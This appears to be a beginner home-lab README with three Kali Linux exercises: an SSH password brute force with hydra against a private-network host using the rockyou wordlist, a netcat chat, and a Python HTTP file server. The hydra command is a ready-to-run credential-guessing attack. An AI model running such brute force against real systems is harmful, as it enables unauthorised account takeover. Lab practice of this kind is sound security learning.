# Kali Projects
Project 1: SSH Brute Force with Hydra
Goal: Use hydra to brute force SSH login.

How to run
Make sure hydra is installed on Kali:

bash
Copy
Edit
sudo apt update
sudo apt install hydra -y
Run the brute force command (replace username, target IP, and wordlist path):

bash
Copy
Edit
hydra -l <username> -P <path_to_wordlist> ssh://<target_ip>
Example:

bash
Copy
Edit
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.10
Project 2: Simple Chat with Netcat
Goal: Set up a simple chat server and client with netcat.

On Ubuntu (server):
Start listening on a port, e.g., 1234:

bash
Copy
Edit
nc -l -p 1234
On Kali (client):
Connect to the server IP and port:

bash
Copy
Edit
nc 192.168.56.10 1234
Now anything you type on client or server side will be sent back and forth.

Project 3: Minimal Python HTTP Server
Goal: Serve files over HTTP from the current directory on Ubuntu.

How to run
Run the Python built-in HTTP server on port 8080:

bash
Copy
Edit
python3 -m http.server 8080
Access from Kali or browser:

cpp
Copy
Edit
http://192.168.56.10:8080
